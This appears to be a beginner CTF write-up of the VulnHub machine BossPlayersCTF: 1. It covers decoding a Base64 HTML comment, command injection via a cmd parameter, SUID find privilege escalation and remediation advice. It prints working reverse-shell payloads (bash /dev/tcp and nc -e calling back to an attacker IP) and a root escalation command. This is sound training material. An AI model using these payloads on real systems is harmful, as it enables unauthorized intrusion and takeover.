# VulnHub BossPlayersCTF: 1 — Base64 Stego to Root via SUID find

Look at this guys!! A machine that hides its attack vector inside a triple-layer Base64 string buried in an HTML comment, then hands you command injection on a silver platter, and finishes with the most GTFOBins-classic SUID escalation you will ever see. Legit a perfect beginner machine for understanding why "security through obscurity" is not security at all. Bruh, encoding your secrets in Base64 is not encryption fr fr.

Thanks to the author for this tight little chain that covers recon, encoding analysis, RCE, and SUID privesc all in one clean package.

---

| Field | Value |
|-------|-------|
| **Level** | Easy / Beginner |
| **Target VM** | BossPlayersCTF: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/bossplayersctf-1,375/ |
| **Techniques** | Web source analysis, multi-layer Base64 decoding, command injection via GET parameter, reverse shell, SUID find privilege escalation |
| **CVEs / CWEs** | CWE-78 (OS Command Injection), CWE-312 (Cleartext Storage in HTML comment), CWE-269 (Improper Privilege Management via SUID), CWE-656 (Security Through Obscurity via Base64) |
| **APT Groups** | APT41 (web-facing command injection for initial access), Lazarus Group (OS command injection in custom web apps), FIN7 (SUID abuse for local privilege escalation) |

---

## Attack Summary

```
[host-discovery: netdiscover]
    |
    v
[nmap: 22/tcp SSH | 80/tcp Rocket httpd]
    |
    v
[view page source => Base64 string in HTML comment]
    |
    v
[3x Base64 decode => "workinginprogress.php"]
    |
    v
[GET ?cmd=id => uid=33(www-data) => command injection confirmed]
    |
    v
[nc listener => reverse shell payload via ?cmd=]
    |
    v
[shell as www-data]
    |
    v
[find / -perm -u=s => /usr/bin/find has SUID]
    |
    v
[find . -exec /bin/sh -p \; -quit => euid=0(root)]
    |
    v
[/root/root.txt | base64 -d]
```

---

## Methodology

1. Host discovery with netdiscover
2. Port scan with nmap: HTTP (80) and SSH (22)
3. View page source, identify Base64 string in HTML comment
4. Multi-layer Base64 decoding to find hidden PHP page
5. Confirm OS command injection via `?cmd=id`
6. Reverse shell via command injection
7. SUID `find` privilege escalation via GTFOBins technique
8. Root flag capture (Base64-encoded)

---

## Step 1 — Identifying the Target

```bash
netdiscover -r 192.168.1.0/24
```

Target: **192.168.1.107**

```bash
nmap -A 192.168.1.107
```

Expected output:

```
22/tcp  open  ssh    OpenSSH
80/tcp  open  http   Rocket httpd
```

Two services: SSH and HTTP. Nothing exotic on the surface.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1046 Network Service Discovery

---

## Step 2 — Web Enumeration

```bash
dirb http://192.168.1.107/
```

`robots.txt` is found. Its contents decode to a troll message: rabbit hole. Classic CTF move.

View the page source of `http://192.168.1.107/` in a browser or via curl:

```bash
curl -s http://192.168.1.107/ | grep '<!--'
```

An HTML comment contains a Base64-encoded string:

```html
<!-- WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK -->
```

> **What is security through obscurity via Base64?** Base64 is an encoding scheme, not encryption. It provides zero confidentiality: any attacker who sees the encoded string can trivially decode it. Embedding "hidden" paths in HTML comments using Base64 is a common developer mistake that provides the illusion of security. This maps to CWE-656 and CWE-312.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1083 File and Directory Discovery

---

## Step 3 — Multi-Layer Base64 Decoding

Decode the string through three rounds of Base64:

```bash
# Round 1
echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d
# Output: ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K

# Round 2
echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d
# Output: d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==

# Round 3
echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d
# Output: workinginprogress.php
```

Hidden page found: `http://192.168.1.107/workinginprogress.php`

Browse to it. The page lists installed software (Debian, Apache2, PHP) and shows two incomplete items:
- "test the ping command" (injection hint)
- "fix privilege escalation" (privesc hint)

The developer literally left a to-do list of vulnerabilities on a publicly accessible page. Noice.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1592.002 Gather Victim Host Information: Software

---

## Step 4 — Command Injection Discovery and Confirmation

> **What is OS Command Injection?** When a web application passes user-supplied input to a system command (via `system()`, `exec()`, `shell_exec()`, `popen()`, `backticks`, etc.) without sanitization, the attacker can append arbitrary commands using shell metacharacters. This maps to CWE-78 and OWASP A03:2021 Injection.

Test the `cmd` GET parameter:

```bash
# Confirm command injection
curl "http://192.168.1.107/workinginprogress.php?cmd=id"
```

Expected output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command injection confirmed as `www-data`. The `cmd` parameter is passed directly to a shell command with zero validation. Rekt.

```bash
# Additional verification
curl "http://192.168.1.107/workinginprogress.php?cmd=whoami"
# www-data

curl "http://192.168.1.107/workinginprogress.php?cmd=hostname"
# bossplayers
```

> **Real-world note:** OS command injection via GET/POST parameters is consistently in the OWASP Top 10 and is actively exploited by APT41 and Lazarus Group in web-facing PHP applications. CVE-2017-12149 (JBoss command injection) and CVE-2021-41277 (Metabase RCE) are real-world examples of the same primitive. Reference: CWE-78, OWASP A03:2021.

> **MITRE ATT&CK:** TA0001 Initial Access | T1190 Exploit Public-Facing Application | T1059.004 Unix Shell

---

## Step 5 — Reverse Shell

Set up a listener on the attacker machine:

```bash
nc -lvp 1234
```

Trigger the reverse shell via the injection point. URL-encode the payload:

```bash
# Using bash TCP reverse shell
curl -G "http://192.168.1.107/workinginprogress.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.105/1234 0>&1'"
```

Or via browser URL (replace spaces with `+` or `%20`):

```
http://192.168.1.107/workinginprogress.php?cmd=nc+-e+/bin/bash+192.168.1.105+1234
```

Shell received as `www-data`. Stabilize:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

> **MITRE ATT&CK:** TA0002 Execution | T1059.004 Unix Shell

---

## Step 6 — Privilege Escalation via SUID find

> **What is SUID privilege escalation?** The SUID (Set User ID) bit on an executable causes it to run with the file owner's permissions rather than the caller's. If a root-owned binary with SUID set can be abused to execute arbitrary commands (as documented in GTFOBins), any user can gain root execution. This maps to CWE-269 and MITRE T1548.001.

Enumerate SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

`/usr/bin/find` has the SUID bit set. GTFOBins documents the escalation:

```bash
find . -exec /bin/sh -p \; -quit
```

Confirm root:

```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root)
```

The `euid=0` (effective UID) is what matters here. The `-p` flag tells `/bin/sh` to preserve the effective UID rather than dropping it.

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/find/

**(☞ﾟヮﾟ)☞ Effective root!! GG!!**

> **MITRE ATT&CK:** TA0004 Privilege Escalation | T1548.001 Setuid and Setgid

---

## Step 7 — Root Flag

```bash
cd /root
ls
cat root.txt
```

The flag content is Base64-encoded. Decode it:

```bash
cat root.txt | base64 -d
```

The author used Base64 on the flag too. Full circle: the machine starts and ends with Base64.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Hidden path | `workinginprogress.php` | HTML comment (3x Base64 decoded) | Navigation |
| RCE as | `www-data (uid=33)` | `?cmd=id` | Command injection |
| Root effective | `euid=0(root)` | SUID find escalation | Privilege escalation |
| Root Flag | Base64-encoded (decode with `base64 -d`) | `/root/root.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Hidden path in HTML comment encoded with multi-layer Base64 | Base64 is encoding, not encryption; developers regularly commit "secrets" this way to git repos | Use `.gitignore`, environment variables, and secret scanning (GitLeaks, TruffleHog) to prevent secrets exposure |
| 2 | `?cmd=` parameter passed to shell without sanitization | OS command injection is a top-tier finding in web application pentests; PHP `system()` calls with user input are particularly dangerous | Validate all input; use parameterized calls or avoid system commands entirely; prefer PHP native functions |
| 3 | SUID bit on `/usr/bin/find` | Developers and sysadmins occasionally set SUID on standard utilities for convenience, creating a permanent privesc path | Audit SUID binaries regularly: `find / -perm -4000 -type f 2>/dev/null`; remove SUID from any utility not requiring it |

**Why does this matter outside the lab?**

OS command injection in web applications is not academic. CVE-2021-41277 (Metabase RCE via `/api/setup/validate`) achieved this exact pattern at scale in production environments. APT41 has extensively documented use of web-facing command injection as a first-stage payload in targeted intrusions. The SUID `find` escalation is so well-known it is referenced in every Linux privilege escalation checklist from LinPEAS to GTFOBins to the OSCP exam. Encountering it in production means someone ran `chmod u+s /usr/bin/find` at some point and never looked back.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Gather Victim Host Information: Software | T1592.002 |
| Reconnaissance | TA0043 | File and Directory Discovery | T1083 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | TA0002 | Exploitation for Client Execution | T1203 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Setuid | T1548.001 |
| Defense Evasion | TA0005 | Obfuscated Files or Information | T1027 |
| Discovery | TA0007 | File and Directory Discovery (SUID enum) | T1083 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Remove the Base64-encoded path from the HTML comment; never use HTML comments to reference internal paths or functionality.
2. Sanitize the `cmd` parameter: validate input, use whitelisting, or eliminate the system command call entirely; prefer PHP native network functions over shell execution.
3. Remove the SUID bit from `/usr/bin/find`: `chmod u-s /usr/bin/find`
4. Audit all SUID binaries and remove unnecessary SUID bits: `find / -perm -4000 -type f 2>/dev/null`
5. Remove or restrict `robots.txt` entries to avoid troll/rabbit holes being indexed.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Block the `?cmd=` parameter at the WAF level immediately.
- Remove or password-protect the `workinginprogress.php` file.
- Audit all files in the web root for system command calls: `grep -r "system\|exec\|shell_exec\|passthru\|popen" /var/www/`
- Review all SUID binaries: `find / -perm -u=s -type f 2>/dev/null`

**MITRE D3FEND countermeasures:**
- D3-IAA Input Allow Listing to prevent OS command injection (T1190, CWE-78)
- D3-EAL Executable Allow Listing to restrict SUID execution paths (T1548.001)
- D3-OAA Outbound Network Traffic Allow Listing to prevent reverse shell callbacks (T1059.004)
- D3-FAPA File Access Pattern Analysis to detect HTML comment exposure of paths (CWE-312)

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.RA): Identify web application attack surface including shell command execution paths.
- Protect (PR.PT-3): Least Functionality; disable unused features and remove debug pages from production.
- Protect (PR.DS-5): Protect against data leaks; review HTML source for embedded secrets.
- Detect (DE.CM-8): Vulnerability scanning to detect command injection endpoints.
- Respond (RS.AN-1): Analysis: investigate all HTTP requests to parameters resembling shell commands.

**NIST SP 800-53 Rev. 5 Controls:**
- SI-10: Information Input Validation (prevent OS command injection via GET parameters)
- CM-7: Least Functionality (remove SUID from standard utilities; remove debug PHP pages)
- AC-6: Least Privilege (web service account should not have SUID escalation path)
- SI-3: Malicious Code Protection (monitor for web shells and RCE in PHP applications)
- AU-3: Content of Audit Records (log all requests to command execution endpoints)

**CISA Known Exploited Vulnerabilities:**
- No direct CVE for this specific custom application; CVE-2021-41277 (Metabase RCE) and CVE-2017-12149 (JBoss RCE) in the CISA KEV represent the same OS command injection primitive at scale.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ASSET (Asset, Change, and Configuration Management)
- Practice: Manage IT Asset Inventory and Configuration
- Target MIL: MIL-1 (baseline inventory of web applications with known SUID exposure)

---

## Final Thoughts

Thanks to the author of BossPlayersCTF: 1 for a machine that is approachable for beginners while demonstrating three genuinely important security concepts: Base64 is not security, unsanitized shell parameters are critical RCE, and SUID on standard utilities is a permanent privesc backdoor.

The triple-layer Base64 trick is a fun puzzle, but the real lesson is that anyone who finds that comment via view-source or `curl` will decode it in under 30 seconds. "Hidden in plain sight" is not access control.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
